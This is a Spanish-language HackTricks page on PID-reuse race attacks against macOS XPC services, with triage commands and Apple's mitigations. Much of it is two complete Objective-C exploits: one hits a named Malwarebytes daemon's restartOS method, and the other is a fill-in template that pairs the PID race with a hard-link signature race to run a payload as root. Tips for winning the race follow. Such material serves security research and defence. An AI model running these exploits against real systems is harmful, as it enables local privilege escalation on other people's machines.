# Reutilización de PID

{{#include ../../../../../../banners/hacktricks-training.md}}

## Reutilización de PID

Cuando un **XPC service** de macOS autentica a un caller resolviendo su **PID** en lugar de usar credenciales vinculadas al mensaje recibido, puede ser vulnerable a un ataque de reutilización de PID. La primitiva práctica no consiste en esperar a que el espacio de nombres de PID dé la vuelta: el atacante envía una solicitud XPC y llama inmediatamente a **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** con `POSIX_SPAWN_SETEXEC`, reemplazando la imagen del proceso del atacante por un **binario permitido mientras conserva el PID**.<sup>[[1]](#references)[[2]](#references)</sup>

Si el servidor extrae la solicitud de la cola y solo entonces resuelve ese PID numérico en un proceso activo para comprobar la firma de código, los entitlements, la ruta o el proceso padre, observa el binario reemplazado en lugar del proceso que envió el mensaje. `POSIX_SPAWN_START_SUSPENDED` mantiene activo y estable el reemplazo de confianza mientras el servidor realiza la comprobación.<sup>[[1]](#references)[[2]](#references)</sup>

### Qué se somete realmente a una condición de carrera

La secuencia vulnerable es un **TOCTOU de identidad del mensaje**, no simplemente que “los PIDs puedan repetirse”:<sup>[[1]](#references)[[2]](#references)</sup>

1. Un proceso atacante establece o reanuda una conexión XPC y pone en cola la solicitud privilegiada.
2. Antes de que el servicio convierta el PID de la conexión en un `SecCodeRef` u otro objeto de proceso, el atacante superpone el mismo proceso con un ejecutable aprobado usando `POSIX_SPAWN_SETEXEC`.
3. El servicio valida la imagen aprobada actualmente asociada a ese PID y, a continuación, despacha la solicitud controlada por el atacante que ya estaba en cola.

Cualquier puente de PID en un flujo de datos de autorización es sospechoso: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` o `audit_token_to_pid` seguidos de `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` o un verificador de firmas personalizado. Un PID usado únicamente para logging no es suficiente; confirma que llega hasta la decisión de allow/deny. Inspecciona también las rutas de error: intentar primero una búsqueda mediante audit token pero **recurrir al PID si falla** restablece la misma condición de carrera. Este patrón de fallback apareció en un análisis de 2026 de los XPC services privilegiados de Intego.<sup>[[3]](#references)</sup>

### Triage estático y dinámico rápido

Comienza por el connection handler y rastrea cada llamada que produzca un PID hasta las comprobaciones de firma de código, entitlements, ruta del ejecutable o versión. Estos comandos proporcionan una primera revisión rápida de un helper candidato; los binarios stripped todavía suelen exponer símbolos importados, selectores de Objective-C o cadenas de diagnóstico:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Durante una prueba controlada, rompe o hookea tanto la fuente del PID como su verificador. Un hit en `xpc_connection_get_pid` o `-processIdentifier` solo es una pista; la evidencia útil es una búsqueda posterior del **mismo entero** después de recibir la solicitud. Frida también puede hookear el verificador específico de la aplicación y el selector privilegiado para medir si el selector se ejecuta cuando la carrera del PID tiene éxito.<sup>[[3]](#references)</sup>

### Ejemplo de exploit

Si encuentras la función **`shouldAcceptNewConnection`** o una función llamada por ella que **llame** a **`processIdentifier`** y no llame a **`auditToken`**, es muy probable que esté **verificando el PID del proceso** y no el audit token.\
Por ejemplo, en esta imagen (tomada de la referencia):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Consulta este exploit de ejemplo (también tomado de la referencia) para ver las 2 partes del exploit:<sup>[[1]](#references)</sup>

- Uno que **genera varios forks**
- **Cada fork** **enviará** el **payload** al servicio XPC mientras ejecuta **`posix_spawn`** justo después de enviar el mensaje.

> [!CAUTION]
> Al competir con `fork()` desde un proceso Objective-C, ejecuta el exploit con `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` exportado o inserta el marcador `__objc_fork_ok`:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Primera opción usando **`NSTasks`** y un argumento para iniciar los hijos y explotar la RC
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Este ejemplo utiliza un **`fork`** sin procesar para lanzar **procesos secundarios que explotarán la condición de carrera del PID** y, posteriormente, explotarán **otra condición de carrera mediante un enlace duro**:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Hacer reproducible la race

Los siguientes puntos de ajuste aparecen de forma recurrente en exploits funcionales de reutilización de PID y en pruebas recientes de privileged-helper:<sup>[[1]](#references)[[3]](#references)</sup>

- Envía la solicitud y llama a `posix_spawn` inmediatamente; **no** esperes la respuesta. La solicitud debe estar ya encolada mientras la búsqueda del PID del servidor ocurre después del reemplazo de la imagen.
- Mantén juntos `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED`. El primer flag conserva el PID del proceso que participa en la race; el segundo evita que el objetivo válido finalice o cambie de estado antes de la validación.
- Usa varios racers de corta duración y reintenta la secuencia completa de conexión/solicitud/exec. El número óptimo depende del objetivo; un exceso de children puede ralentizar el servicio y empeorar la ventana.
- El reemplazo debe satisfacer **todo** el requisito del servidor. Reutiliza el binario del cliente legítimo cuando sea posible y comprueba primero su designated requirement con `codesign -d -r- "/path/to/client.app"`.
- Primero invoca un selector exportado inofensivo o un método de solo lectura. Esto separa la autenticación exitosa de la explotación exitosa de un primitive privilegiado posterior.

## Evitar el puente de PID

En macOS 13+, Foundation expone `-[NSXPCConnection setCodeSigningRequirement:]`. Establece el requisito del peer exactamente una vez y **antes** de `resume`; las cadenas de requisitos malformadas generan una excepción (o un fatal error de Swift), y un mensaje de un peer que no satisface el requisito invalida la conexión. Esto permite que XPC aplique la identidad de código del peer sin que el código de la aplicación resuelva un PID.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Para la API moderna de listener de bajo nivel en macOS 26+, `xpc_listener_set_peer_requirement` aplica un `xpc_peer_requirement_t` validado mientras el listener está inactivo. XPC descarta las solicitudes que no lo cumplen; las sesiones peer creadas desde el listener **no** lo heredan, por lo que también debes aplicar un requisito de sesión adecuado cuando esas sesiones autoricen operaciones privilegiadas.<sup>[[7]](#references)</sup>

> [!WARNING]
> No “soluciones” esto copiando un audit token y convirtiéndolo después de nuevo en un PID para la búsqueda real de `SecCode`. Mantén la identidad derivada del audit token durante la decisión de autorización, o utiliza una API de requisitos peer de XPC de principio a fin.<sup>[[2]](#references)[[6]](#references)</sup> Las API de audit token para toda la conexión también tienen una clase de race distinta, descrita en [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md).

## Otros ejemplos

- [**Intego X9: Por qué tu antivirus de macOS no debería confiar en los PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - LPE contra el helper privilegiado de un antivirus que autenticaba a los clientes mediante PID.<sup>[[3]](#references)</sup>
- [**Explotación del servicio XPC de GOG Galaxy para la escalada de privilegios en macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [Aprende explotación de XPC - Parte 2: ¡Di no al PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [¡No confíes en el PID! Historias de un simple error lógico y dónde encontrarlo - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Por qué tu antivirus de macOS no debería confiar en los PIDs](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Explotación del servicio XPC de GOG Galaxy para la escalada de privilegios en macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
